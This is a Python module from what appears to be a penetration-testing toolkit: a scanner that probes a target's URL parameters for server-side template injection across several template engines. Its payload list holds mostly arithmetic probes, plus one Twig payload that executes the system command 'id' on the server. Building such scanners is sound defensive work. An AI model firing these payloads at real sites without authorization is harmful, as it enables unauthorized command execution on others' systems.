"""SSTI 模板注入检测器"""
import time
import urllib.parse
from typing import List
from secops_core.http_client import http_get
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class SSTIDetector(BaseDetector):
    """服务端模板注入检测器"""

    name = "ssti"
    category = "SSTI"

    MATH_PAYLOADS = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("${7*7}", "49", "FreeMarker/Velocity"),
        ("<%= 7*7 %>", "49", "ERB"),
        ("#{7*7}", "49", "Slim/Ruby"),
        ("{{constructor.constructor('return this')()}}", "[object", "Vue.js"),
        ("*{7*7}", "49", "Thymeleaf"),
        ("{{dump(app)}}", "Application", "Twig"),
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid=", "Twig"),
    ]

    COMMON_PARAMS = [
        "q", "search", "name", "template", "page", "file",
        "path", "include", "input", "text", "content", "message"
    ]

    def test(self, target_url: str, params: list = None) -> List[Finding]:
        findings = []
        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params is None:
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = self.COMMON_PARAMS

        # 获取基准响应
        _, _, baseline_body = http_get(target_url)
        baseline_size = len(baseline_body) if baseline_body else 0

        for param in params:
            for payload, expected, engine in self.MATH_PAYLOADS:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("SSTI_TEST", test_url, f"param={param}, engine={engine}")
                status, headers, body = http_get(test_url)

                if status == 0:
                    continue

                body_differs = abs(len(body) - baseline_size) > 200 if body else False

                if expected in body and payload not in body and body_differs:
                    findings.append(Finding(
                        vuln_type="SSTI", severity="critical",
                        title=f"服务端模板注入 ({engine}) - 参数 {param}",
                        location=test_url, payload=payload,
                        evidence=f"注入 {payload} -> 响应包含 {expected}，模板引擎: {engine}",
                        description=f"参数 {param} 存在 {engine} 模板注入漏洞。",
                        remediation="禁止用户输入直接进入模板渲染，使用沙箱模板引擎"
                    ))
                    break

                # 检查模板引擎错误信息
                error_indicators = [
                    "TemplateSyntaxError", "Jinja2", "Twig_Error",
                    "FreeMarker template error", "Mako", "SyntaxError",
                    "TemplateError", "Liquid::SyntaxError"
                ]
                for indicator in error_indicators:
                    if indicator in body and payload in body:
                        findings.append(Finding(
                            vuln_type="SSTI", severity="high",
                            title=f"疑似模板注入 (错误泄露) - 参数 {param}",
                            location=test_url, payload=payload,
                            evidence=f"模板引擎错误信息泄露: {indicator}",
                            description=f"参数 {param} 触发了模板引擎错误。",
                            remediation="禁止在错误信息中暴露模板引擎详情"
                        ))
                        break

                time.sleep(ATTACK_DELAY)

        return findings
